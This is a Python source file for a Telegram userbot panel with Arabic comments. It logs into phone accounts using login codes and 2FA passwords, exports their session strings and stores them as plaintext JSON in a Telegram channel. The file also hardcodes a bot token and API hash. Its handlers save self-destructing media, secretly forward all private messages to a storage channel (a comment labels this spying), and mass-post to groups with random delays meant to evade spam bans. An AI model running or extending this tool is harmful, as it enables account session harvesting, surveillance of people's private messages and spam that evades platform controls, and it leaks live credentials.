import os
import asyncio
import json
import re
import time
import random
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters
from pyrogram.handlers import MessageHandler
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid, AuthKeyUnregistered

# ==========================================
# 1. إعدادات اليوزر بوت
# ==========================================
BOT_TOKEN = "8666142908:AAFZhEu_McY2TEy_6wtGbB7RhjFbxF7fTeE"
API_ID = 37129514
API_HASH = "29af008f32ddd784867118d0a58fb8c6"
PRIMARY_ADMIN_ID = 8145086924
DB_CHANNEL_ID = -1004352728061

bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}
RUNNING_CLIENTS = {}
LAST_REPLY_TIME = {} # تتبع وقت آخر رد تلقائي { "phone": { "user_id": timestamp } }

# ==========================================
# 2. نظام قاعدة البيانات السحابية
# ==========================================
DB_STATE = {
    "admins": [PRIMARY_ADMIN_ID],
    "accounts": {} 
}
DB_MESSAGE_ID = None

async def sync_from_channel():
    global DB_STATE, DB_MESSAGE_ID
    try:
        chat = await bot.get_chat(DB_CHANNEL_ID)
        if chat.pinned_message:
            DB_MESSAGE_ID = chat.pinned_message.message_id
            text = chat.pinned_message.text or chat.pinned_message.caption
            if text:
                match = re.search(r'(\{.*\})', text, re.DOTALL)
                if match:
                    try:
                        data = json.loads(match.group(1))
                        DB_STATE["admins"] = list(set(data.get("admins", []) + [PRIMARY_ADMIN_ID]))
                        
                        accounts = data.get("accounts", {})
                        for phone, info in accounts.items():
                            if isinstance(info, str):
                                accounts[phone] = {"session": info, "owner_id": PRIMARY_ADMIN_ID, "auto_save": False, "autopost": [], "storage_chat_id": None, "auto_reply": {"active": False, "msg": "", "cooldown_hours": 3}}
                            else:
                                if "auto_save" not in info: info["auto_save"] = False
                                if "autopost" not in info or isinstance(info["autopost"], dict): info["autopost"] = []
                                if "storage_chat_id" not in info: info["storage_chat_id"] = None
                                if "auto_reply" not in info: info["auto_reply"] = {"active": False, "msg": "", "cooldown_hours": 3}
                        DB_STATE["accounts"] = accounts
                        print(f"✅ تم استرجاع {len(DB_STATE['accounts'])} حساب محفوظ.")
                        return
                    except Exception as e:
                        print(f"❌ فشل فك التشفير: {e}")
        await save_to_channel()
    except Exception as e:
        print(f"❌ خطأ قراءة القناة: {e}")
        await save_to_channel(create_new=True)

async def save_to_channel(create_new=False):
    global DB_MESSAGE_ID
    if PRIMARY_ADMIN_ID not in DB_STATE["admins"]:
        DB_STATE["admins"].append(PRIMARY_ADMIN_ID)
    payload = json.dumps(DB_STATE, indent=2, ensure_ascii=False)
    formatted_text = f"📦 **قاعدة بيانات اليوزر بوت**\n\n```json\n{payload}\n```"
    try:
        if DB_MESSAGE_ID and not create_new:
            try:
                await bot.edit_message_text(formatted_text, chat_id=DB_CHANNEL_ID, message_id=DB_MESSAGE_ID, parse_mode="Markdown")
            except Exception as edit_err:
                if "message to edit not found" in str(edit_err).lower():
                    msg = await bot.send_message(DB_CHANNEL_ID, formatted_text, parse_mode="Markdown")
                    DB_MESSAGE_ID = msg.message_id
                    await bot.pin_chat_message(DB_CHANNEL_ID, msg.message_id)
        else:
            msg = await bot.send_message(DB_CHANNEL_ID, formatted_text, parse_mode="Markdown")
            DB_MESSAGE_ID = msg.message_id
            await bot.pin_chat_message(DB_CHANNEL_ID, msg.message_id)
    except Exception as e:
        pass

# ==========================================
# 3. أنظمة اليوزر بوت الآلية المستمرة
# ==========================================
async def handle_private_messages(client, message):
    """معالج رئيسي لرسائل الخاص (ذاتية + تحويل للمجموعة + رد تلقائي)"""
    phone = getattr(client, "acc_phone", None)
    if not phone: return
    acc_info = DB_STATE["accounts"].get(phone, {})
    
    # 1. صيد الوسائط ذاتية التدمير
    is_ttl = False
    if getattr(message, "ttl_seconds", None): is_ttl = True
    elif message.photo and getattr(message.photo, "ttl_seconds", None): is_ttl = True
    elif message.video and getattr(message.video, "ttl_seconds", None): is_ttl = True
    elif message.voice and getattr(message.voice, "ttl_seconds", None): is_ttl = True
    elif message.video_note and getattr(message.video_note, "ttl_seconds", None): is_ttl = True

    if is_ttl and acc_info.get("auto_save"):
        try:
            path = await message.download()
            if path:
                sender_name = message.from_user.first_name if message.from_user else "مجهول"
                caption = f"🤫 **تم صيد رسالة ذاتية التدمير!**\nالمرسل: {sender_name}"
                if message.photo: await client.send_photo("me", path, caption=caption)
                elif message.video: await client.send_video("me", path, caption=caption)
                elif message.voice: await client.send_voice("me", path, caption=caption)
                elif message.video_note: await client.send_video_note("me", path)
                else: await client.send_document("me", path, caption=caption)
                os.remove(path)
        except Exception as e:
            print(f"Error saving TTL: {e}")

    # 2. تحويل الرسائل العادية لمجموعة التخزين
    storage_id = acc_info.get("storage_chat_id")
    if storage_id and not is_ttl:
        try:
            # تحويل الرسالة لقناة التخزين الخاصة
            await message.forward(storage_id)
        except Exception as e:
            pass

    # 3. الرد التلقائي الذكي
    auto_reply = acc_info.get("auto_reply", {})
    if auto_reply.get("active") and auto_reply.get("msg") and message.from_user:
        user_id = message.from_user.id
        cooldown_sec = auto_reply.get("cooldown_hours", 3) * 3600
        
        # التأكد من إنشاء القاموس للحساب إذا لم يكن موجوداً
        if phone not in LAST_REPLY_TIME: LAST_REPLY_TIME[phone] = {}
        
        last_time = LAST_REPLY_TIME[phone].get(user_id, 0)
        current_time = time.time()
        
        # إذا مرت المدة المحددة (أو كانت أول مرة يرسل فيها)
        if (current_time - last_time) >= cooldown_sec:
            try:
                await client.send_message(user_id, auto_reply["msg"])
                LAST_REPLY_TIME[phone][user_id] = current_time # تحديث الوقت
            except Exception:
                pass

async def start_active_sessions():
    """تشغيل جميع الحسابات في الخلفية مع ربط المعالج الشامل"""
    for phone, info in DB_STATE["accounts"].items():
        if phone not in RUNNING_CLIENTS:
            session = info.get("session")
            client = Client(f"acc_{phone}", session_string=session, in_memory=True)
            client.acc_phone = phone
            
            # معالج واحد شامل لجميع رسائل الخاص (واردة فقط)
            client.add_handler(MessageHandler(handle_private_messages, filters.private & filters.incoming))
            
            try:
                await client.start()
                RUNNING_CLIENTS[phone] = client
                print(f"✅ الحساب {phone} متصل وجاهز للاستماع.")
            except Exception as e:
                print(f"❌ فشل تشغيل {phone}: {e}")

async def autopost_loop():
    """مؤقت زمني للنشر التلقائي مع حماية من الباند"""
    while True:
        await asyncio.sleep(30) 
        current_time = time.time()
        db_changed = False
        
        for phone, info in DB_STATE["accounts"].items():
            tasks = info.get("autopost", [])
            client = RUNNING_CLIENTS.get(phone)
            if not client: continue
            
            for task in tasks:
                if task.get("active"):
                    interval_sec = task.get("interval", 60) * 60
                    last_sent = task.get("last_sent", 0)
                    
                    if (current_time - last_sent) >= interval_sec:
                        msg_text = task.get("msg")
                        targets = task.get("targets", [])
                        
                        for target in targets:
                            try:
                                await client.send_message(target, msg_text)
                                # تأخير عشوائي بين 10 إلى 25 ثانية بين كل قروب وقروب لتفادي حظر السبام!
                                await asyncio.sleep(random.randint(10, 25)) 
                            except Exception as e:
                                print(f"⚠️ خطأ النشر لـ {target} (حساب {phone}): {e}")
                        
                        task["last_sent"] = time.time() # تحديث الوقت بعد انتهاء النشر
                        db_changed = True
                        
        if db_changed:
            await save_to_channel()

# ==========================================
# 4. لوحة التحكم والإدارة
# ==========================================
@bot.message_handler(commands=['start'])
async def start_cmd(message):
    user_id = message.chat.id
    if user_id not in DB_STATE["admins"]: return

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("➕ إضافة حساب", callback_data="add_account"),
        InlineKeyboardButton("📱 حساباتي المرتبطة", callback_data="my_accounts")
    )
    if user_id == PRIMARY_ADMIN_ID:
        markup.add(InlineKeyboardButton("👥 إدارة الإدمنية", callback_data="manage_admins"))
    
    owned = sum(1 for acc in DB_STATE["accounts"].values() if acc["owner_id"] == user_id)
    await bot.send_message(
        user_id,
        f"👋 **أهلاً بك في لوحة تحكم اليوزر بوت المتقدمة**\n\n📱 حساباتك المرتبطة: **{owned}**",
        reply_markup=markup, parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.message.chat.id in DB_STATE["admins"])
async def callbacks(call):
    user_id = call.message.chat.id
    data = call.data

    if data == "add_account":
        user_states[user_id] = {"step": "phone"}
        await bot.send_message(user_id, "📱 أرسل رقم الحساب مع المفتاح الدولي (مثال: `+9665...`):", parse_mode="Markdown")
        await bot.answer_callback_query(call.id)
        
    elif data == "my_accounts":
        markup = InlineKeyboardMarkup()
        owned = [phone for phone, info in DB_STATE["accounts"].items() if info["owner_id"] == user_id]
        for phone in owned:
            markup.add(InlineKeyboardButton(f"📱 {phone}", callback_data=f"panel_{phone}"))
        await bot.edit_message_text("👇 **حساباتك المرتبطة:**", chat_id=user_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif data.startswith("panel_"):
        phone = data.split("_")[1]
        acc_info = DB_STATE["accounts"].get(phone, {})
        
        save_status = "✅ مفعل" if acc_info.get("auto_save") else "❌ معطل"
        reply_status = "✅ مفعل" if acc_info.get("auto_reply", {}).get("active") else "❌ معطل"
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(f"📥 صيد الذاتية: {save_status}", callback_data=f"autosave_{phone}"))
        markup.add(InlineKeyboardButton(f"🔄 إدارة مهام النشر التلقائي", callback_data=f"autopost_{phone}"))
        markup.add(InlineKeyboardButton(f"💬 الرد التلقائي بالخاص: {reply_status}", callback_data=f"autoreply_toggle_{phone}"))
        markup.add(InlineKeyboardButton("⚙️ إعدادات الرد التلقائي", callback_data=f"autoreply_setup_{phone}"))
        markup.add(InlineKeyboardButton("🔗 الانضمام لقناة", callback_data=f"join_{phone}"), InlineKeyboardButton("✍️ النبذة", callback_data=f"bio_{phone}"))
        markup.add(InlineKeyboardButton("🗑 حذف الحساب", callback_data=f"delete_{phone}"), InlineKeyboardButton("🔙 رجوع", callback_data="my_accounts"))
        
        await bot.edit_message_text(f"⚙️ **تحكم حساب: `{phone}`**\nيتم تحويل رسائل الخاص تلقائياً إلى مجموعة التخزين.", chat_id=user_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    # --- إدارة الذاتية ---
    elif data.startswith("autosave_"):
        phone = data.split("_")[1]
        current_status = DB_STATE["accounts"][phone].get("auto_save", False)
        DB_STATE["accounts"][phone]["auto_save"] = not current_status
        await save_to_channel()
        call.data = f"panel_{phone}"
        await callbacks(call)

    # --- إدارة الرد التلقائي ---
    elif data.startswith("autoreply_toggle_"):
        phone = data.split("_")[2]
        current_status = DB_STATE["accounts"][phone]["auto_reply"]["active"]
        
        if not current_status and not DB_STATE["accounts"][phone]["auto_reply"].get("msg"):
            await bot.answer_callback_query(call.id, "❌ يجب إعداد رسالة الرد أولاً من الإعدادات!", show_alert=True)
            return
            
        DB_STATE["accounts"][phone]["auto_reply"]["active"] = not current_status
        await save_to_channel()
        call.data = f"panel_{phone}"
        await callbacks(call)

    elif data.startswith("autoreply_setup_"):
        phone = data.split("_")[2]
        user_states[user_id] = {"step": "autoreply_msg", "phone": phone}
        await bot.send_message(user_id, "💬 **أرسل النص الذي تريده للرد التلقائي:**", parse_mode="Markdown")
        await bot.answer_callback_query(call.id)

    # --- إدارة النشر التلقائي المتعدد ---
    elif data.startswith("autopost_"):
        phone = data.split("_")[1]
        tasks = DB_STATE["accounts"][phone].get("autopost", [])
        markup = InlineKeyboardMarkup()
        
        for i, task in enumerate(tasks):
            status = "✅" if task.get("active") else "❌"
            targets_count = len(task.get("targets", []))
            markup.add(InlineKeyboardButton(f"{status} مهمة {i+1} ({targets_count} قروبات) - كل {task['interval']}د", callback_data=f"togglepost_{phone}_{i}"))
            markup.add(InlineKeyboardButton(f"🗑 حذف المهمة {i+1}", callback_data=f"delpost_{phone}_{i}"))
            
        markup.add(InlineKeyboardButton("➕ إضافة رسالة جديدة للنشر", callback_data=f"newpost_{phone}"))
        markup.add(InlineKeyboardButton("🔙 رجوع للحساب", callback_data=f"panel_{phone}"))
        
        await bot.edit_message_text(f"🔄 **إدارة مهام النشر التلقائي - `{phone}`**\n(يوجد فاصل زمني آمن بين كل قروب لتفادي الحظر):", chat_id=user_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif data.startswith("togglepost_"):
        _, phone, idx = data.split("_")
        idx = int(idx)
        current = DB_STATE["accounts"][phone]["autopost"][idx]["active"]
        DB_STATE["accounts"][phone]["autopost"][idx]["active"] = not current
        await save_to_channel()
        call.data = f"autopost_{phone}"
        await callbacks(call)

    elif data.startswith("delpost_"):
        _, phone, idx = data.split("_")
        idx = int(idx)
        DB_STATE["accounts"][phone]["autopost"].pop(idx)
        await save_to_channel()
        call.data = f"autopost_{phone}"
        await callbacks(call)

    elif data.startswith("newpost_"):
        phone = data.split("_")[1]
        user_states[user_id] = {"step": "post_targets", "phone": phone}
        await bot.send_message(user_id, "🎯 **أرسل معرفات القنوات/القروبات:**\nأرسلها مفصولة بمسافة (مثال: `@group1 @group2`):", parse_mode="Markdown")
        await bot.answer_callback_query(call.id)

    # --- بقية الأوامر ---
    elif data.startswith("bio_"):
        phone = data.split("_")[1]
        user_states[user_id] = {"step": "wait_bio", "phone": phone}
        await bot.send_message(user_id, "✍️ أرسل النبذة (Bio) الجديدة الآن:")
        await bot.answer_callback_query(call.id)

    elif data.startswith("join_"):
        phone = data.split("_")[1]
        user_states[user_id] = {"step": "wait_link", "phone": phone}
        await bot.send_message(user_id, "🔗 أرسل رابط القناة أو الجروب:")
        await bot.answer_callback_query(call.id)
        
    elif data.startswith("delete_"):
        phone = data.split("_")[1]
        DB_STATE["accounts"].pop(phone, None)
        if phone in RUNNING_CLIENTS:
            await RUNNING_CLIENTS[phone].stop()
            RUNNING_CLIENTS.pop(phone, None)
        await save_to_channel()
        await bot.answer_callback_query(call.id, "✅ تم الحذف.", show_alert=True)
        await bot.edit_message_text("✅ تم الحذف بنجاح.", chat_id=user_id, message_id=call.message.message_id)

    # --- إدارة الإدمنية للمدير الأساسي ---
    elif data == "manage_admins" and user_id == PRIMARY_ADMIN_ID:
        markup = InlineKeyboardMarkup()
        for ad_id in DB_STATE["admins"]:
            if ad_id != PRIMARY_ADMIN_ID:
                markup.add(InlineKeyboardButton(f"👤 {ad_id}", callback_data=f"none"), InlineKeyboardButton("🗑 حذف", callback_data=f"remove_admin_{ad_id}"))
        markup.add(InlineKeyboardButton("➕ إضافة أدمن جديد", callback_data="add_admin"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_main"))
        await bot.edit_message_text("👥 **قائمة الإدمنية الحاليين:**", chat_id=user_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        
    elif data == "add_admin" and user_id == PRIMARY_ADMIN_ID:
        user_states[user_id] = {"step": "add_admin_id"}
        await bot.send_message(user_id, "👥 أرسل الآي دي (ID) الخاص بالأدمن الجديد:")
        await bot.answer_callback_query(call.id)
        
    elif data.startswith("remove_admin_") and user_id == PRIMARY_ADMIN_ID:
        target = int(data.split("_")[2])
        if target in DB_STATE["admins"]:
            DB_STATE["admins"].remove(target)
            await save_to_channel()
            call.data = "manage_admins"
            await callbacks(call)
            
    elif data == "back_main":
        await start_cmd(call.message)

@bot.message_handler(func=lambda msg: msg.chat.id in DB_STATE["admins"] and msg.chat.id in user_states)
async def handle_inputs(message):
    user_id = message.chat.id
    state = user_states[user_id]
    step = state.get("step")

    # [تسجيل الدخول و إنشاء مجموعة التخزين]
    if step == "phone":
        phone = message.text.strip().replace(" ", "")
        client = Client(f"temp_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        try:
            sent_code = await client.send_code(phone)
            user_states[user_id] = {"step": "code", "phone": phone, "client": client, "phone_code_hash": sent_code.phone_code_hash}
            await bot.reply_to(message, "📩 تم إرسال الكود. أرسله هنا (مثال: `1 2 3 4 5`):", parse_mode="Markdown")
        except Exception as e:
            await client.disconnect()
            user_states.pop(user_id, None)
            await bot.reply_to(message, f"❌ خطأ: {e}")

    elif step == "code":
        code = message.text.strip().replace(" ", "")
        client = state["client"]
        phone = state["phone"]
        try:
            await client.sign_in(phone, state["phone_code_hash"], code)
            session = await client.export_session_string()
            
            # 🟢 إنشاء قناة خاصة لحفظ الرسائل (التجسس)
            storage_chat_id = None
            try:
                chat = await client.create_channel("مجموعة التخزين", "يتم تحويل رسائل الخاص هنا تلقائياً")
                storage_chat_id = chat.id
            except Exception as e:
                print(f"Failed to create storage group: {e}")

            DB_STATE["accounts"][phone] = {
                "session": session, "owner_id": user_id, "auto_save": False, 
                "autopost": [], "storage_chat_id": storage_chat_id,
                "auto_reply": {"active": False, "msg": "", "cooldown_hours": 3}
            }
            await save_to_channel()
            await client.disconnect()
            await start_active_sessions()
            user_states.pop(user_id, None)
            await bot.reply_to(message, f"✅ **تم ربط الحساب `{phone}`!**\nتم إنشاء 'مجموعة التخزين' بنجاح في حسابك لاستقبال رسائل الخاص.", parse_mode="Markdown")
        except SessionPasswordNeeded:
            user_states[user_id]["step"] = "2fa"
            await bot.reply_to(message, "🔐 الحساب محمي (2FA). أرسل كلمة المرور:")
        except Exception as e:
            await bot.reply_to(message, f"❌ خطأ: {e}")

    elif step == "2fa":
        client = state["client"]
        phone = state["phone"]
        try:
            await client.check_password(message.text.strip())
            session = await client.export_session_string()
            
            storage_chat_id = None
            try:
                chat = await client.create_channel("مجموعة التخزين", "يتم تحويل رسائل الخاص هنا تلقائياً")
                storage_chat_id = chat.id
            except Exception as e:
                pass

            DB_STATE["accounts"][phone] = {
                "session": session, "owner_id": user_id, "auto_save": False, 
                "autopost": [], "storage_chat_id": storage_chat_id,
                "auto_reply": {"active": False, "msg": "", "cooldown_hours": 3}
            }
            await save_to_channel()
            await client.disconnect()
            await start_active_sessions()
            user_states.pop(user_id, None)
            await bot.reply_to(message, f"✅ **تم ربط الحساب `{phone}`!**\nتم إنشاء 'مجموعة التخزين' بنجاح.", parse_mode="Markdown")
        except Exception as e:
            await bot.reply_to(message, f"❌ كلمة المرور خطأ: {e}")

    # [إعدادات الرد التلقائي]
    elif step == "autoreply_msg":
        user_states[user_id]["reply_msg"] = message.text
        user_states[user_id]["step"] = "autoreply_cooldown"
        await bot.reply_to(message, "⏳ **كم ساعة يجب أن تمر حتى يرد البوت على نفس الشخص مرة أخرى؟**\n(أرسل رقم فقط، مثال: `5` يعني لن يرد عليه مرة ثانية إلا بعد 5 ساعات):")

    elif step == "autoreply_cooldown":
        try:
            hours = int(message.text.strip())
            phone = state["phone"]
            DB_STATE["accounts"][phone]["auto_reply"]["msg"] = state["reply_msg"]
            DB_STATE["accounts"][phone]["auto_reply"]["cooldown_hours"] = hours
            await save_to_channel()
            user_states.pop(user_id, None)
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 رجوع للحساب", callback_data=f"panel_{phone}"))
            await bot.reply_to(message, "✅ **تم حفظ إعدادات الرد التلقائي بنجاح!**\nيمكنك الآن تفعيل الميزة من لوحة تحكم الحساب.", reply_markup=markup, parse_mode="Markdown")
        except:
            await bot.reply_to(message, "❌ يرجى إرسال رقم الساعات فقط (مثال: `5`).")

    # [إعدادات النشر التلقائي المتعدد]
    elif step == "post_targets":
        targets = [t.strip() for t in re.split(r'[, \n]+', message.text) if t.strip()]
        user_states[user_id]["targets"] = targets
        user_states[user_id]["step"] = "post_msg"
        await bot.reply_to(message, f"🎯 تم حفظ ({len(targets)}) قروبات.\n✍️ أرسل الآن الرسالة (النص) التي تريد نشرها:")

    elif step == "post_msg":
        user_states[user_id]["msg"] = message.text
        user_states[user_id]["step"] = "post_interval"
        await bot.reply_to(message, "⏱ أرسل المدة الزمنية بين كل نشر بالدقائق (مثلاً `60` تعني كل ساعة):")

    elif step == "post_interval":
        try:
            interval = int(message.text.strip())
            phone = state["phone"]
            task = {
                "active": True, "targets": state["targets"], "msg": state["msg"],
                "interval": interval, "last_sent": 0
            }
            DB_STATE["accounts"][phone]["autopost"].append(task)
            await save_to_channel()
            user_states.pop(user_id, None)
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 رجوع لإدارة النشر", callback_data=f"autopost_{phone}"))
            await bot.reply_to(message, "✅ **تم إضافة مهمة النشر بنجاح!**", reply_markup=markup, parse_mode="Markdown")
        except:
            await bot.reply_to(message, "❌ يرجى إرسال أرقام فقط للدقائق.")

    # [بقية الأوامر الفورية]
    elif step == "wait_bio":
        phone = state["phone"]
        if phone in RUNNING_CLIENTS:
            await RUNNING_CLIENTS[phone].update_profile(bio=message.text)
            await bot.reply_to(message, "✅ تم تغيير النبذة!")
        user_states.pop(user_id, None)

    elif step == "wait_link":
        phone = state["phone"]
        link = message.text.strip()
        if "t.me/+" not in link and "joinchat" not in link:
            link = f"@{link.split('t.me/')[-1].split('/')[0].split('?')[0]}" if "t.me/" in link else f"@{link.replace('@', '')}"
        
        if phone in RUNNING_CLIENTS:
            try:
                await RUNNING_CLIENTS[phone].join_chat(link)
                await bot.reply_to(message, "✅ تم الانضمام بنجاح!")
            except Exception as e:
                await bot.reply_to(message, f"❌ خطأ: {e}")
        user_states.pop(user_id, None)

    elif step == "add_admin_id":
        try:
            new_id = int(message.text.strip())
            if new_id not in DB_STATE["admins"]:
                DB_STATE["admins"].append(new_id)
                await save_to_channel()
            await bot.reply_to(message, f"✅ تم ترقية `{new_id}` كأدمن فرعي.", parse_mode="Markdown")
        except:
            await bot.reply_to(message, "❌ يرجى إرسال أرقام فقط.")
        user_states.pop(user_id, None)

# ==========================================
# 5. دوال التشغيل والمزامنة
# ==========================================
async def start_bot():
    await sync_from_channel()
    await start_active_sessions()
    asyncio.create_task(autopost_loop())
    print("Bot 2 (Advanced Userbot Agency) is running actively...")
    await bot.polling(non_stop=True)

def run():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_bot())
